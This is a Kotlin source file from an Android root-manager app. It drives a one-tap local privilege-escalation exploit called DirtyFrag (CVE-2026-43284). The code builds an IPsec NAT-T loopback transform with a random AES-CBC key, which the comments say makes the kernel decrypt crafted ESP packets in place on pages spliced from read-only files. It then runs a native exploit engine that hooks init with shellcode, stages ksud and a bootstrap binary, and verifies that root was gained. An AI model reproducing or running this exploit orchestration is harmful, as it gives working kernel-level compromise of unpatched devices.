package com.agnessu.yakayn.data.dirtyfrag

import android.annotation.SuppressLint
import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.os.SystemClock
import android.provider.Settings
import androidx.annotation.RequiresApi
import com.agnessu.yakayn.BuildConfig
import com.agnessu.yakayn.Natives
import df.root.ExploitRunner
import df.root.IReporter
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

/**
 * One-tap DirtyFrag (CVE-2026-43284) root orchestrator, reworked after
 * dugongzi/DirtyFragX (engine from mitschud/DirtyFrag 1.16 / DFRoot 4.5):
 * the run screen reports Ready / Running / Verifying / Rooted / Failure /
 * Reboot required, keeps the last run log per boot, and exposes the two
 * options bootstrap.c reads from device-protected prefs (soft reboot and
 * disabling KernelSU modules before the late-load).
 *
 * Unlike the standalone DirtyFragX app this one always roots *AgnesSU*: ksud is
 * staged from this app's own nativeLibraryDir and the late-load names this
 * package, so no other manager is touched.
 */
class DirtyFragRepository(private val context: Context) {

    private val _state = MutableStateFlow(DirtyFragUiState())
    val state: StateFlow<DirtyFragUiState> = _state.asStateFlow()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var installJob: Job? = null

    val snapshot: DirtyFragDeviceSnapshot by lazy { DirtyFragDeviceSnapshot.current() }

    private val deContext: Context
        get() = context.createDeviceProtectedStorageContext()

    /** Device-protected data dir of the *running* package: /data/user_de/0/<pkg>/. */
    private val deDataDir: File
        get() = deContext.filesDir.parentFile

    /** DirtyFragX keeps only the newest run log, and only for the current boot. */
    private val lastLogFile: File
        get() = File(deContext.filesDir, LOG_FILE)

    init {
        scope.launch {
            val prefs = dePrefs()
            _state.value = _state.value.copy(
                softReboot = prefs.getBoolean(PREF_SOFT_REBOOT, false),
                disableModules = prefs.getBoolean(PREF_DISABLE_MODULES, false),
            )
            _state.value = _state.value.copy(log = "kernel: ${snapshot.kernelVersionFull}")
            replayLastLog()
            refreshLocked(initial = true)
        }
    }

    @SuppressLint("NewApi")
    fun install() {
        if (installJob?.isActive == true) return
        installJob = scope.launch {
            _state.value = _state.value.copy(
                phase = DirtyFragInstallPhase.Checking,
                log = "",
                failureReason = null,
            )
            appendLog("kernel: ${snapshot.kernelVersionFull}")
            try {
                require(snapshot.isAarch64) { "aarch64 required" }
                require(snapshot.isApiSupported) { "Android 10+ required" }
                val reporter = IReporter { appendLog(it) }

                if (isAgnesSuActive()) {
                    _state.value = _state.value.copy(rebootRequired = false)
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU already active")
                    return@launch
                }

                // The libc++ shellcode creates /dev/df as an O_EXCL mutex the
                // first time it runs: a retry this boot cannot re-hook init.
                if (hookedThisBoot()) {
                    _state.value = _state.value.copy(rebootRequired = true)
                    throw IllegalStateException(
                        "init was already hooked on this boot but AgnesSU is not active; " +
                            "reboot the device, then run DirtyFrag again",
                    )
                }

                // A run that dies half-way leaves the page-cache patch behind, so
                // never let the next boot inherit a success from it.
                markLastRun(false)
                setPhase(DirtyFragInstallPhase.Exploiting, "[*] Running DirtyFrag (CVE-2026-43284)")
                val code = runExploit(reporter)
                if (code == 4) {
                    _state.value = _state.value.copy(rebootRequired = true)
                    throw IllegalStateException(
                        "init was already hooked on this boot; reboot the device before running DirtyFrag again",
                    )
                }
                if (code != 0 && isAgnesSuActive()) {
                    markLastRun(true)
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                    return@launch
                }
                require(code == 0) { "DirtyFrag returned $code" }

                // Exit code 0 only means ksud accepted the late-load request:
                // ksud daemonizes, so the kernel module may still be loading (or
                // fail later). Wait for the driver to answer. On success ksud
                // force-stops this app, so the restarted app's init() is the
                // authority; a surviving process that never sees the driver has
                // genuinely failed.
                setPhase(DirtyFragInstallPhase.Verifying, "[*] late-load dispatched, verifying...")
                if (awaitAgnesSuActive()) {
                    markLastRun(true)
                    _state.value = _state.value.copy(rebootRequired = false)
                    setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                    appendLog("[*] Root complete")
                } else {
                    _state.value = _state.value.copy(rebootRequired = hookedThisBoot())
                    throw IllegalStateException(
                        "late-load did not bring AgnesSU up in time; check the log above. " +
                            "If it actually succeeded, restart this app to re-check; otherwise reboot before retrying.",
                    )
                }
            } catch (error: Throwable) {
                if (error is CancellationException) throw error
                if (hookedThisBoot()) {
                    _state.value = _state.value.copy(rebootRequired = true)
                }
                appendLog("[-] ${error.message ?: error.javaClass.simpleName}")
                _state.value = _state.value.copy(
                    failureReason = error.message ?: error.javaClass.simpleName,
                )
                markLastRun(false)
                setPhase(DirtyFragInstallPhase.Failed, "[*] Root failed")
            }
        }
    }

    /** bootstrap.c reads soft_reboot from the DE prefs right before late-load. */
    fun setSoftReboot(enabled: Boolean) {
        dePrefs().edit().putBoolean(PREF_SOFT_REBOOT, enabled).apply()
        _state.value = _state.value.copy(softReboot = enabled)
    }

    /** bootstrap.c marks every installed module disabled when this is set. */
    fun setDisableModules(enabled: Boolean) {
        dePrefs().edit().putBoolean(PREF_DISABLE_MODULES, enabled).apply()
        _state.value = _state.value.copy(disableModules = enabled)
    }

    /**
     * Re-check the live state, e.g. when the screen is shown again after
     * late-load restarted the app. Never interferes with a running install.
     */
    fun refresh() {
        if (installJob?.isActive == true) return
        scope.launch { refreshLocked(initial = false) }
    }

    private fun refreshLocked(initial: Boolean) {
        val active = isAgnesSuActive()
        val hooked = !active && hookedThisBoot()
        when {
            active -> {
                _state.value = _state.value.copy(
                    phase = DirtyFragInstallPhase.Installed,
                    rebootRequired = false,
                )
                if (initial) appendLog("[*] AgnesSU already active, no need to run DirtyFrag")
            }

            hooked -> {
                _state.value = _state.value.copy(
                    phase = DirtyFragInstallPhase.Failed,
                    rebootRequired = true,
                )
                if (initial) {
                    appendLog("[!] init was already hooked on this boot; reboot required before running DirtyFrag")
                }
            }

            else -> {
                _state.value = _state.value.copy(rebootRequired = false)
                if (initial) {
                    _state.value = _state.value.copy(
                        phase = if (lastRunFailed()) {
                            DirtyFragInstallPhase.Failed
                        } else {
                            DirtyFragInstallPhase.Ready
                        },
                    )
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun runExploit(reporter: IReporter): Int {
        reportDeviceInfo(reporter)
        writePrefs()

        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager

        // NAT-T UDP encapsulation socket: the kernel decrypts crafted ESP
        // packets in-place on pages the native engine spliced from read-only
        // files. encapPort is where the native sender connects to.
        val encapSock = ipsec.openUdpEncapsulationSocket()
        val encapPort = encapSock.port

        // Source port for the native sender. The engine opens its own UDP socket
        // and bind()s it to this port, so only reserve a free ephemeral port and
        // release it immediately — exactly how DFRoot's ExploitRunner does it.
        // Keeping it bound would make the native bind() fail with EADDRINUSE.
        val senderPort = DatagramSocket().use { it.localPort }

        // IPv4 loopback explicitly: openUdpEncapsulationSocket() is IPv4 and the
        // destination address family must match it. InetAddress
        // .getLoopbackAddress() returns ::1 (IPv6), which makes
        // buildTransportModeTransform throw "UDP encapsulation socket and
        // destination address families must match".
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)

        // AES-256-CBC only. DFRoot's ESP layout (SPI + seq + IV + 16-byte block)
        // carries no authentication ICV, so no HMAC key or setAuthentication.
        val aesKey = ByteArray(32)
        SecureRandom().nextBytes(aesKey)

        // setIpv4Encapsulation applies the NAT-T transform to the encapsulation
        // socket in both directions, so no separate applyTransportModeTransform
        // call is needed (matches DFRoot's ExploitRunner).
        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spi)

        try {
            stageKsud(reporter)
            stageBootstrap(reporter)
            val bin = File(context.applicationInfo.nativeLibraryDir, "libdfroot.so")
            require(bin.isFile) { "libdfroot.so missing from native library dir" }
            // Resolve the bootstrap path at runtime: a spoofed/renamed build runs
            // under a randomized applicationId, so the ko must exec *this*
            // package's staged bootstrap, not a hardcoded one.
            val bootstrapPath = File(deDataDir, "bootstrap").absolutePath
            return ExploitRunner.run(
                bin = bin,
                encapPort = encapPort,
                senderPort = senderPort,
                spi = spi.spi,
                aesKey = aesKey,
                bootstrapPath = bootstrapPath,
                onLine = { reporter.report(it) },
            )
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encapSock.close() }
        }
    }

    /** KernelSU is up and recognises this manager — the same signal Home uses
     *  for "installed". */
    private fun isAgnesSuActive(): Boolean =
        runCatching { Natives.isManager }.getOrDefault(false)

    /** /dev/df is the shellcode's O_EXCL mutex: present once init was hooked. */
    private fun hookedThisBoot(): Boolean = File("/dev/df").exists()

    /** Poll the (cheap) driver check; ksud daemonizes, so readiness is delayed. */
    private suspend fun awaitAgnesSuActive(timeoutMs: Long = 60_000): Boolean {
        val start = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - start < timeoutMs) {
            if (isAgnesSuActive()) return true
            delay(1_000)
        }
        return isAgnesSuActive()
    }

    /** Same device banner DirtyFragX prints before attacking. */
    private fun reportDeviceInfo(reporter: IReporter) {
        reporter.report("* app version: ${BuildConfig.VERSION_NAME}\n")
        reporter.report("* manufacturer: ${snapshot.manufacturer}\n")
        reporter.report("* model: ${snapshot.model}\n")
        reporter.report("* android version: ${Build.VERSION.RELEASE}\n")
        reporter.report("* security patch: ${Build.VERSION.SECURITY_PATCH}\n")
        reporter.report("* kernel version: ${snapshot.kernelVersionFull}\n\n")
    }

    /**
     * bootstrap reads these from device-protected storage before it late-loads
     * ksud. su_manager is this package (so ksud restarts *this* manager, never
     * another one); the two booleans come from the options on the run screen.
     */
    private fun writePrefs() {
        dePrefs().edit()
            .putString(PREF_SU_MANAGER, context.packageName)
            .putBoolean(PREF_SOFT_REBOOT, _state.value.softReboot)
            .putBoolean(PREF_DISABLE_MODULES, _state.value.disableModules)
            .commit()
    }

    /**
     * Copy AgnesSU's bundled ksud (libksud.so) to <deDataDir>/ksud — the path
     * bootstrap late-loads (derived from /proc/self/exe at runtime). DirtyFragX
     * can fall back to the largest .so in the manager's lib dir when a fork
     * renames libksud.so, so mirror that heuristic instead of hard failing.
     */
    private fun stageKsud(reporter: IReporter) {
        val ksud = resolveKsudLib(context.applicationInfo.nativeLibraryDir)
            ?: error("ksud library not found in native library dir")
        stageFile(ksud, "ksud", reporter)
    }

    /**
     * Copy the DirtyFrag post-root stage (libbootstrap.so) to
     * <deDataDir>/bootstrap — the path the ko executes. --bootstrap-path patches
     * it into the shellcode as the ko's "bootstrap=" module parameter, so the
     * LKM execs this package's copy even on spoofed builds.
     */
    private fun stageBootstrap(reporter: IReporter) {
        stageFile(
            File(context.applicationInfo.nativeLibraryDir, "libbootstrap.so"),
            "bootstrap",
            reporter,
        )
    }

    private fun resolveKsudLib(nativeLibDir: String): File? {
        if (nativeLibDir.isBlank()) return null
        val dir = File(nativeLibDir)
        val direct = File(dir, "libksud.so")
        if (direct.isFile) return direct
        return dir.listFiles { file -> file.name.endsWith(".so") }
            ?.filter { file -> file.name !in KSUD_SKIP && file.length() >= MIN_KSUD_SIZE }
            ?.maxByOrNull { file -> file.length() }
    }

    private fun stageFile(src: File, destName: String, reporter: IReporter) {
        require(src.isFile) { "${src.name} missing from native library dir" }
        val target = File(deDataDir, destName)
        if (target.isFile && target.length() == src.length()) {
            reporter.report("[*] $destName already staged")
            return
        }
        src.inputStream().use { input ->
            target.outputStream().use { output -> input.copyTo(output) }
        }
        target.setExecutable(true, false)
        reporter.report("[*] $destName staged -> ${target.absolutePath}")
    }

    private fun setPhase(phase: DirtyFragInstallPhase, message: String) {
        _state.value = _state.value.copy(phase = phase)
        appendLog(message)
    }

    private fun appendLog(line: String) {
        val cleanLine = stripAnsi(line).trim()
        if (cleanLine.isBlank()) return
        _state.value = _state.value.copy(log = (_state.value.log + "\n" + cleanLine).trim())
        persistLog()
    }

    /** Shows the log of the previous run, unless it belongs to an older boot. */
    private fun replayLastLog() {
        if (!lastLogFile.isFile) return
        if (dePrefs().getInt(PREF_LOG_BOOT, -1) != bootCount()) {
            lastLogFile.delete()
            return
        }
        val text = runCatching { lastLogFile.readText() }.getOrDefault("")
        if (text.isBlank()) return
        // Keep the kernel banner in front of the replayed log.
        _state.value = _state.value.copy(log = (_state.value.log + "\n" + text.trim()).trim())
    }

    private fun persistLog() {
        runCatching {
            lastLogFile.writeText(_state.value.log)
            dePrefs().edit().putInt(PREF_LOG_BOOT, bootCount()).apply()
        }
    }

    private fun markLastRun(success: Boolean) {
        dePrefs().edit().putBoolean(PREF_LAST_SUCCESS, success).apply()
    }

    private fun lastRunFailed(): Boolean =
        lastLogFile.isFile && !dePrefs().getBoolean(PREF_LAST_SUCCESS, true)

    private fun dePrefs() = deContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    private fun bootCount(): Int = runCatching {
        Settings.Global.getInt(context.contentResolver, Settings.Global.BOOT_COUNT, -1)
    }.getOrDefault(-1)

    companion object {
        private const val PREFS_NAME = "dirtyfrag"
        private const val PREF_SU_MANAGER = "su_manager"
        private const val PREF_SOFT_REBOOT = "soft_reboot"
        private const val PREF_DISABLE_MODULES = "disable_modules"
        private const val PREF_LAST_SUCCESS = "last_run_success"
        private const val PREF_LOG_BOOT = "log_boot_count"
        private const val LOG_FILE = "last_run.log"
        private const val MIN_KSUD_SIZE = 512L * 1024L
        private val KSUD_SKIP = setOf("libadbroot.so", "libkernelsu.so", "libkptools.so")
        private val ANSI_ESCAPE = Regex("\u001B\\[[0-?]*[ -/]*[@-~]")

        private fun stripAnsi(value: String): String =
            ANSI_ESCAPE.replace(value, "").replace("\r", "")
    }
}
